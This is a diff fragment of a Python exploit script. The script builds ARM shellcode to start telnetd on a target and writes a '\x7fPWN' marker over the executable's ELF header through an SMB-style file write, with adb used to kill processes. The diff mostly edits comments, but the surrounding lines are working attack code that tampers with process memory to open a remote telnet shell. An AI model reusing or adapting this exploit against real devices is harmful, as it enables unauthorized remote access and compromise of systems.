@@ -50,7 +50,8 @@ shell = '''
     push {r0,r1,r2,r3,r5,r6,r7,r8,LR}
     mov r8, sp
 '''
-# check for the mark indicating that telnetd have already been started
+# check for the mark indicating that telnetd have already been started.
+# the base address of the executable map will be changed from b'\x7fELF' to b'\x7fPWN' after the shellcode will be triggered by this python script.
 shell += '''
     mov.w r1, #'''+hex(initbase)+'''
     ldr r0, [r1, #0]
@@ -131,7 +132,7 @@ call(['adb', 'shell', 'kill', '-9', str(pid2)], stdin=PIPE, stdout=PIPE)
 p1.kill()
 
 # put a mark at the base of the executable section to make sure the execve section in the sellcode is not spammed
-conn.writeFile(treeid, memid, b'\x7fPWN', initbase) # BL 0x000852A8
+conn.writeFile(treeid, memid, b'\x7fPWN', initbase)
 conn.closeFile(treeid, memid)
 conn.disconnectTree(treeid)
 conn.logoff()
